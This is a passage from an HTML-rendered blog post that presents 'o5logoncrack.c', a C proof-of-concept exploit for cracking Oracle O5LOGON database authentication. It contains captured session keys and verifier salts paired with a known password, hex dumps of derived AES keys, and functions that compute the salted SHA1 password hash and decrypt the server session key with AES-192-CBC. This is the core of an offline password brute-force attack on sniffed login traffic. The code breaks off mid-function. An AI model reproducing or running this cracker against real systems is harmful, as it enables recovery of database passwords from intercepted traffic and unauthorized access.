<span class="hljs-number">85</span> <span class="hljs-number">46</span><br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">aes</span> key<br><span class="hljs-attribute">0000</span> c3 d9 <span class="hljs-number">87</span> <span class="hljs-number">62</span> d2 <span class="hljs-number">58</span> d4 bd <span class="hljs-number">92</span> c5 <span class="hljs-number">72</span> <span class="hljs-number">06</span> <span class="hljs-number">5</span>d de a9 af<br><span class="hljs-attribute">0010</span> <span class="hljs-number">38</span> <span class="hljs-number">12</span> <span class="hljs-number">3</span>f <span class="hljs-number">88</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span> <span class="hljs-number">00</span><br><br><span class="hljs-attribute">decrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">21</span> <span class="hljs-number">64</span> <span class="hljs-number">7</span>f ef <span class="hljs-number">76</span> d3 ee <span class="hljs-number">80</span> ed <span class="hljs-number">24</span> <span class="hljs-number">47</span> <span class="hljs-number">50</span> f8 f4 f0 a6<br><span class="hljs-attribute">0010</span> e4 <span class="hljs-number">18</span> a3 <span class="hljs-number">2</span>a <span class="hljs-number">40</span> <span class="hljs-number">0</span>b <span class="hljs-number">96</span> ea <span class="hljs-number">5</span>b <span class="hljs-number">70</span> <span class="hljs-number">26</span> ab <span class="hljs-number">6</span>a e4 <span class="hljs-number">62</span> f5<br><span class="hljs-attribute">0020</span> <span class="hljs-number">81</span> e0 <span class="hljs-number">62</span> <span class="hljs-number">1</span>c <span class="hljs-number">13</span> a0 <span class="hljs-number">21</span> <span class="hljs-number">90</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span> <span class="hljs-number">08</span><br><br><span class="hljs-attribute">encrypted_server_sesskey</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">52</span> fc <span class="hljs-number">04</span> b1 ff <span class="hljs-number">81</span> <span class="hljs-number">10</span> ca <span class="hljs-number">12</span> <span class="hljs-number">63</span> df <span class="hljs-number">5</span>b c6 <span class="hljs-number">1</span>a <span class="hljs-number">7</span>e <span class="hljs-number">57</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>c <span class="hljs-number">8</span>a <span class="hljs-number">51</span> <span class="hljs-number">11</span> d2 <span class="hljs-number">2</span>b <span class="hljs-number">41</span> e5 <span class="hljs-number">3</span>c c1 <span class="hljs-number">67</span> fd f2 a6 <span class="hljs-number">87</span><br><span class="hljs-attribute">0020</span> <span class="hljs-number">89</span> <span class="hljs-number">58</span> <span class="hljs-number">20</span> <span class="hljs-number">0</span>d <span class="hljs-number">9</span>b <span class="hljs-number">2</span>b <span class="hljs-number">6</span>a <span class="hljs-number">51</span> c9 <span class="hljs-number">5</span>d <span class="hljs-number">77</span> <span class="hljs-number">9</span>f de ba bb <span class="hljs-number">69</span><br><br><span class="hljs-attribute">AUTH_SESSKEY</span><br><span class="hljs-attribute">0000</span> <span class="hljs-number">52</span> fc <span class="hljs-number">04</span> b1 ff <span class="hljs-number">81</span> <span class="hljs-number">10</span> ca <span class="hljs-number">12</span> <span class="hljs-number">63</span> df <span class="hljs-number">5</span>b c6 <span class="hljs-number">1</span>a <span class="hljs-number">7</span>e <span class="hljs-number">57</span><br><span class="hljs-attribute">0010</span> <span class="hljs-number">74</span> <span class="hljs-number">0</span>c <span class="hljs-number">8</span>a <span class="hljs-number">51</span> <span class="hljs-number">11</span> d2 <span class="hljs-number">2</span>b <span class="hljs-number">41</span> e5 <span class="hljs-number">3</span>c c1 <span class="hljs-number">67</span> fd f2 a6 <span class="hljs-number">87</span><br><span class="hljs-attribute">0020</span> <span class="hljs-number">89</span> <span class="hljs-number">58</span> <span class="hljs-number">20</span> <span class="hljs-number">0</span>d <span class="hljs-number">9</span>b <span class="hljs-number">2</span>b <span class="hljs-number">6</span>a <span class="hljs-number">51</span> c9 <span class="hljs-number">5</span>d <span class="hljs-number">77</span> <span class="hljs-number">9</span>f de ba bb <span class="hljs-number">69</span><br></code></pre></td></tr></table></figure><h2 id="exploit-POC"><a href="#exploit-POC" class="headerlink" title="exploit (POC)"></a>exploit (POC)</h2><p>o5logoncrack.c</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* </span><br><span class="hljs-comment">11.1</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD:            nsfocus</span><br><span class="hljs-comment">AUTH_SESSKEY:        43FD38029377C84620AE1851FC1D231409985064DEA0D0B8D48E50E6051751A5D8FDFEAAA9F83B99F37B051FA67F8546</span><br><span class="hljs-comment">AUTH_SESSKEY_CLIENT: C7248F0873F04B5A02E59178804BD361B0C77B20A4CF685460DA472996D5245745A791DFEA14399831EC62380808903C</span><br><span class="hljs-comment">AUTH_PASSWORD:       8B4C7D85F421EBA059FDBA21F5708FD4D3BB8AB2168941243B5EF07681F3B80A</span><br><span class="hljs-comment">AUTH_VFR_DATA:       3DA8A309D636ACF87004</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD HASH:       EF92924A1DB06441457FDABC24BF89055C8594F7</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">11.2</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD    :           nsfocus</span><br><span class="hljs-comment">AUTH_SESSKEY:           52FC04B1FF8110CA1263DF5BC61A7E57740C8A5111D22B41E53CC167FDF2A6878958200D9B2B6A51C95D779FDEBABB69</span><br><span class="hljs-comment">AUTH_SESSKEY_C          FA6DCD0F389E92D18F8188EC69313B524F421184FAE679613A72FC8DFD0A4C7BB93A6ACB8E05B8258A020D2954EC1B63</span><br><span class="hljs-comment">AUTH_PASSWORD           2C5F957A6532AD91D916F4E5FA7D2FDA0E6CDFFBAAED883CAF4F200C8983AE3D</span><br><span class="hljs-comment">AUTH_VFR_DATA           43E0BE20B32B0BB76E57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">PASSWORD HASH:          C3D98762D258D4BD92C572065DDEA9AF38123F88 43E0BE20B32B0BB76E57</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">11.x</span><br><span class="hljs-comment">ED91B97A04000F326F17430A65DACB30CD1EF788E6EC310742B811E32112C0C9CC39554C9C01A090CB95E95C94140C28</span><br><span class="hljs-comment">40E7B86C99F4BF1D0F17538C22EBCE054F5F677E2B521480F1F56143D047C00469A87049DE1B9CADDC8EA71392AD6E3A</span><br><span class="hljs-comment">2D4FD970C12D9618742E4525C514105E0BE24DE75C04A0C4BF6DD46BE88A339E</span><br><span class="hljs-comment">7FD52BC80AA5836695D4</span><br><span class="hljs-comment">18C314BE125DF23689215C78C33F623AABF1152E</span><br><span class="hljs-comment"></span><br><span class="hljs-comment"></span><br><span class="hljs-comment">-------------------------------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 ef 92 92 4a 1d b0 64 41 45 7f da bc 24 bf 89 05</span><br><span class="hljs-comment">0010 5c 85 94 f7 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 47 43 56 45 1f 61 c7 89 68 83 be ad ed c0 f4 54</span><br><span class="hljs-comment">0010 e3 dd 61 88 7e 78 d8 9a bc 8f dc 15 4f a6 2f 26</span><br><span class="hljs-comment">0020 a0 35 e2 63 68 bb 02 1b 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="hljs-comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="hljs-comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 43 fd 38 02 93 77 c8 46 20 ae 18 51 fc 1d 23 14</span><br><span class="hljs-comment">0010 09 98 50 64 de a0 d0 b8 d4 8e 50 e6 05 17 51 a5</span><br><span class="hljs-comment">0020 d8 fd fe aa a9 f8 3b 99 f3 7b 05 1f a6 7f 85 46</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">----------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 c3 d9 87 62 d2 58 d4 bd 92 c5 72 06 5d de a9 af</span><br><span class="hljs-comment">0010 38 12 3f 88 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 21 64 7f ef 76 d3 ee 80 ed 24 47 50 f8 f4 f0 a6</span><br><span class="hljs-comment">0010 e4 18 a3 2a 40 0b 96 ea 5b 70 26 ab 6a e4 62 f5</span><br><span class="hljs-comment">0020 81 e0 62 1c 13 a0 21 90 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="hljs-comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="hljs-comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 52 fc 04 b1 ff 81 10 ca 12 63 df 5b c6 1a 7e 57</span><br><span class="hljs-comment">0010 74 0c 8a 51 11 d2 2b 41 e5 3c c1 67 fd f2 a6 87</span><br><span class="hljs-comment">0020 89 58 20 0d 9b 2b 6a 51 c9 5d 77 9f de ba bb 69</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">------------------</span><br><span class="hljs-comment">aes key</span><br><span class="hljs-comment">0000 18 c3 14 be 12 5d f2 36 89 21 5c 78 c3 3f 62 3a</span><br><span class="hljs-comment">0010 ab f1 15 2e 00 00 00 00</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">decrypted_server_sesskey</span><br><span class="hljs-comment">0000 07 eb ab db ee 3a 0e b0 ab e1 9f 68 12 c1 e3 e6</span><br><span class="hljs-comment">0010 5a e9 fd 7c b9 ca ae e2 fb 21 20 d4 af 83 de 0c</span><br><span class="hljs-comment">0020 1e 12 dc 01 22 05 a0 75 08 08 08 08 08 08 08 08</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">encrypted_server_sesskey</span><br><span class="hljs-comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span><br><span class="hljs-comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span><br><span class="hljs-comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">AUTH_SESSKEY</span><br><span class="hljs-comment">0000 ed 91 b9 7a 04 00 0f 32 6f 17 43 0a 65 da cb 30</span><br><span class="hljs-comment">0010 cd 1e f7 88 e6 ec 31 07 42 b8 11 e3 21 12 c0 c9</span><br><span class="hljs-comment">0020 cc 39 55 4c 9c 01 a0 90 cb 95 e9 5c 94 14 0c 28</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/aes.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/md5.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;openssl/sha.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;getopt.h&quot;</span></span><br><br><br><span class="hljs-comment">//*********************************************************************************************************************</span><br><span class="hljs-comment">// Hashes captured on the network during authentication phase</span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123;  0x43,0xFD,0x38,0x02,0x93,0x77,0xC8,0x46,0x20,0xAE,0x18,0x51,0xFC,0x1D,0x23,0x14,0x09,0x98,0x50,0x64,0xDE,0xA0,0xD0,0xB8,0xD4,0x8E,0x50,0xE6,0x05,0x17,0x51,0xA5,0xD8,0xFD,0xFE,0xAA,0xA9,0xF8,0x3B,0x99,0xF3,0x7B,0x05,0x1F,0xA6,0x7F,0x85,0x46&#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY_C[] = &#123;  0xC7,0x24,0x8F,0x08,0x73,0xF0,0x4B,0x5A,0x02,0xE5,0x91,0x78,0x80,0x4B,0xD3,0x61,0xB0,0xC7,0x7B,0x20,0xA4,0xCF,0x68,0x54,0x60,0xDA,0x47,0x29,0x96,0xD5,0x24,0x57,0x45,0xA7,0x91,0xDF,0xEA,0x14,0x39,0x98,0x31,0xEC,0x62,0x38,0x08,0x08,0x90,0x3C&#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_PASSWORD [] = &#123;  0x8B,0x4C,0x7D,0x85,0xF4,0x21,0xEB,0xA0,0x59,0xFD,0xBA,0x21,0xF5,0x70,0x8F,0xD4,0xD3,0xBB,0x8A,0xB2,0x16,0x89,0x41,0x24,0x3B,0x5E,0xF0,0x76,0x81,0xF3,0xB8,0x0A &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x3D,0xA8,0xA3,0x09,0xD6,0x36,0xAC,0xF8,0x70,0x04 &#125;;</span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0x52,0xFC,0x04,0xB1,0xFF,0x81,0x10,0xCA,0x12,0x63,0xDF,0x5B,0xC6,0x1A,0x7E,0x57,0x74,0x0C,0x8A,0x51,0x11,0xD2,0x2B,0x41,0xE5,0x3C,0xC1,0x67,0xFD,0xF2,0xA6,0x87,0x89,0x58,0x20,0x0D,0x9B,0x2B,0x6A,0x51,0xC9,0x5D,0x77,0x9F,0xDE,0xBA,0xBB,0x69 &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY_C[] = &#123; 0xFA,0x6D,0xCD,0x0F,0x38,0x9E,0x92,0xD1,0x8F,0x81,0x88,0xEC,0x69,0x31,0x3B,0x52,0x4F,0x42,0x11,0x84,0xFA,0xE6,0x79,0x61,0x3A,0x72,0xFC,0x8D,0xFD,0x0A,0x4C,0x7B,0xB9,0x3A,0x6A,0xCB,0x8E,0x05,0xB8,0x25,0x8A,0x02,0x0D,0x29,0x54,0xEC,0x1B,0x63 &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_PASSWORD [] = &#123; 0x2C,0x5F,0x95,0x7A,0x65,0x32,0xAD,0x91,0xD9,0x16,0xF4,0xE5,0xFA,0x7D,0x2F,0xDA,0x0E,0x6C,0xDF,0xFB,0xAA,0xED,0x88,0x3C,0xAF,0x4F,0x20,0x0C,0x89,0x83,0xAE,0x3D &#125;;</span><br><span class="hljs-comment">//</span><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123;  0x43,0xE0,0xBE,0x20,0xB3,0x2B,0x0B,0xB7,0x6E,0x57 &#125;;</span><br><span class="hljs-comment">//</span><br><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123; 0xED,0x91,0xB9,0x7A,0x04,0x00,0x0F,0x32,0x6F,0x17,0x43,0x0A,0x65,0xDA,0xCB,0x30,0xCD,0x1E,0xF7,0x88,0xE6,0xEC,0x31,0x07,0x42,0xB8,0x11,0xE3,0x21,0x12,0xC0,0xC9,0xCC,0x39,0x55,0x4C,0x9C,0x01,0xA0,0x90,0xCB,0x95,0xE9,0x5C,0x94,0x14,0x0C,0x28 &#125;; </span><br><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x7F,0xD5,0x2B,0xC8,0x0A,0xA5,0x83,0x66,0x95,0xD4 &#125;; </span><br><br><span class="hljs-comment">//unsigned char AUTH_SESSKEY  [] = &#123;   0xBD,0x53,0x44,0x89,0x91,0xEE,0xAB,0x1E,0xCD,0x8D,0x32,0xFB,0x59,0x52,0x3F,0x0C,0xBD,0xB3,0x3B,0x40,0xC2,0x8F,0xEB,0xED,0xDD,0x5A,0xA3,0xA4,0xAF,0x0C,0xF6,0xB7,0x23,0x06,0x16,0x2D,0x3F,0x0C,0x1E,0x8D,0xB2,0x53,0x8A,0xF2,0x91,0xEC,0x01,0xA5&#125;;</span><br><br><span class="hljs-comment">//unsigned char AUTH_VFR_DATA [] = &#123; 0x03,0x1C,0xB4,0x72,0xC4,0xD9,0x04,0x12,0xDD,0x31 &#125;; </span><br><br><span class="hljs-comment">//*********************************************************************************************************************</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">HexStringtoBinArray</span><span class="hljs-params">(<span class="hljs-type">char</span>* str, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* <span class="hljs-built_in">array</span>)</span>&#123;<br>    <span class="hljs-type">int</span> alen=<span class="hljs-built_in">strlen</span>(str)/<span class="hljs-number">2</span>;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> t[<span class="hljs-number">2</span>];<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> hexc;<br>    <span class="hljs-type">int</span> j=<span class="hljs-number">0</span>;<br>    <span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;<br>    <span class="hljs-keyword">for</span>(;i&lt;<span class="hljs-built_in">strlen</span>(str);i=i+<span class="hljs-number">2</span>)&#123;<br>        t[<span class="hljs-number">0</span>]=str[i];<br>        t[<span class="hljs-number">1</span>]=str[i+<span class="hljs-number">1</span>];<br>        hexc = t[<span class="hljs-number">0</span>]<span class="hljs-number">-48</span>;<br>        <span class="hljs-keyword">if</span> (hexc &gt; <span class="hljs-number">9</span>) hexc-=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">array</span>[j]=hexc*<span class="hljs-number">16</span>;<br>        hexc = t[<span class="hljs-number">1</span>]<span class="hljs-number">-48</span>;<br>        <span class="hljs-keyword">if</span> (hexc &gt; <span class="hljs-number">9</span>) hexc-=<span class="hljs-number">7</span>;<br>        <span class="hljs-built_in">array</span>[j]+=hexc;<br>        j++;<br>    &#125;<br>    <span class="hljs-keyword">return</span> j;<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> <span class="hljs-title function_">hexdump</span><span class="hljs-params">( FILE *f, <span class="hljs-type">const</span> <span class="hljs-type">char</span> *title, <span class="hljs-type">const</span> <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> *s,<span class="hljs-type">int</span> l)</span> &#123;<br>    <span class="hljs-type">int</span> n = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;%s&quot;</span>, title);<br>    <span class="hljs-keyword">for</span> (; n &lt; l; ++n) &#123;<br>        <span class="hljs-keyword">if</span> ((n % <span class="hljs-number">16</span>) == <span class="hljs-number">0</span>) &#123;<br>                <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n%04x&quot;</span>, n);<br>        &#125;<br>        <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot; %02x&quot;</span>, s[n]);<br>    &#125;<br><br>    <span class="hljs-built_in">fprintf</span>(f, <span class="hljs-string">&quot;\n&quot;</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_MixCase_Hash</span> <span class="hljs-params">(<span class="hljs-type">char</span> *passwd, <span class="hljs-type">int</span> passwd_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> salt[<span class="hljs-number">10</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* oracle_mixcase_hash)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> to_hash[<span class="hljs-number">256</span>];<br>    SHA_CTX ctx;<br><br>    <span class="hljs-built_in">memcpy</span> (to_hash, passwd, passwd_len);<br>    <span class="hljs-built_in">memcpy</span> (to_hash+passwd_len, salt, <span class="hljs-number">10</span>);<br><br>    SHA1_Init (&amp;ctx);<br>    SHA1_Update (&amp;ctx, to_hash, passwd_len+<span class="hljs-number">10</span>);<br>    SHA1_Final (oracle_mixcase_hash, &amp;ctx);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_TNS_Decrypt_AES192_CBC</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">int</span> input_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> iv[] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>&#125;;<br><br>    AES_KEY key;<br>    AES_set_decrypt_key(aes_key_bytes, <span class="hljs-number">192</span>, &amp;key);<br>    AES_cbc_encrypt(input, output, input_len, &amp;key, iv, AES_DECRYPT);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">ORACLE_TNS_Encrypt_AES192_CBC</span> <span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> aes_key_bytes[<span class="hljs-number">24</span>], <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* input, <span class="hljs-type">int</span> input_len, <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span>* output)</span> &#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">char</span> iv[] = &#123;<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span class="hljs-number">0</span>,<span 